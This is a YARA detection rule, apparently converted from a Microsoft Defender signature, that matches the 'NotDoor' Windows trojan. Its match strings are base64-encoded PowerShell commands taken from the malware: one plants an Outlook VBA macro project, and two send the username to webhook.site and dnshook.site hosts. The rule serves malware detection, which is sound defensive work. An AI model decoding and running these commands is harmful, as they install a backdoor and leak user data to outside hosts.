rule Trojan_Win64_NotDoor_A_2147951616_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/NotDoor.A!dha"
        threat_id = "2147951616"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "NotDoor"
        severity = "Critical"
        info = "dha: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateProcess failed (" ascii //weight: 1
        $x_1_2 = "-enc JABhAD0AJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAOwBjAG8AcAB5ACAAYwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdABlAHMAdAB0AGUAbQBwAC4AaQBuAGkAIAAiACQAYQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwB1AHQAbABvAG8AawBcAFYAYgBhAFAAcgBvAGoAZQBjAHQALgBPAFQATQAiAA==" ascii //weight: 1
        $x_1_3 = "-enc bgBzAGwAbwBvAGsAdQBwACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFAC4AOQAxADAAYwBmADMANQAxAC0AYQAwADUAZAAtADQAZgA2ADcALQBhAGIAOABlAC0ANgBmADYAMgBjAGYAYQA4AGUAMgA2AGQALgBkAG4AcwBoAG8AbwBrAC4AcwBpAHQAZQAiAA==" ascii //weight: 1
        $x_1_4 = "-enc YwBtAGQAIAAvAGMAIABjAHUAcgBsACAAIgBoAHQAdABwADoALwAvAHcAZQBiAGgAbwBvAGsALgBzAGkAdABlAC8AOQAxADAAYwBmADMANQAxAC0AYQAwADUAZAAtADQAZgA2ADcALQBhAGIAOABlAC0ANgBmADYAMgBjAGYAYQA4AGUAMgA2AGQAPwAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFACIA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

